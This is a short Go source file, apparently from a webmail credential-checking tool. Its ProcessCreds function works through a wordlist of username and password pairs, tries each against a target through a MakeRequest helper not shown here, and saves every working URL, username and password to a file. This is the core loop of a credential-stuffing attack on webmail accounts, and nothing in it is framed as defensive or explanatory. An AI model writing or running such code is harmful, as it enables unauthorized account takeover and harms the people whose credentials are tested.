package webmail

import (
	"fmt"
	"os"
	"sync"

	"github.com/fatih/color"
)

func ProcessCreds(wordlistChunks <-chan []string, wg *sync.WaitGroup, mutex *sync.Mutex, file *os.File, totalChecks *int) {
	defer wg.Done()
	credsChunks := <-wordlistChunks
	for _, creds := range credsChunks {
		splittedCreds, err := ReformCreds(creds)
		if err == nil {
			result, err := MakeRequest(splittedCreds)
			mutex.Lock()
			if err == nil {
				*totalChecks++
				username, password, targetURL := result[0], result[1], result[2]
				color.New(color.FgBlue).Printf("%d: -> ", *totalChecks)
				color.New(color.FgGreen).Printf("%s|%s|%s -> SUCCESS\n", targetURL, username, password)
				savedResult := fmt.Sprintf("%s|%s|%s\n", targetURL, username, password)
				file.WriteString(savedResult)
			} else {
				*totalChecks++
				color.New(color.FgBlue).Printf("%d: -> ", *totalChecks)
				color.New(color.FgRed).Printf("%s -> FAILED!\n", creds)
			}
			mutex.Unlock()
		}
	}
}
